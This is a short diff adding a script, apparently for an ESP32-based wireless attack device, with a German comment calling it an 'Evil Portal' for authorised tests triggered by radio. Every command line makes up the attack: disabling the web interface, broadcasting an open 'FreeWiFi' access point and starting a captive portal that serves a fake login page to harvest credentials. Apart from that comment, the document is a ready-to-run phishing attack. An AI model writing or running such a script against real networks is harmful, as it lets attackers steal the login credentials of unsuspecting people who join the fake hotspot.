@@ -1,0 +1,5 @@
+REM G4MEOVER — Evil Portal (autorisierte Tests). Funk-getriggert via ukfe_rf.
+WEB_OFF
+ESP32M ssid -a -n FreeWiFi
+ESP32M select -a 1
+ESP32M evilportal -c start -w login.html
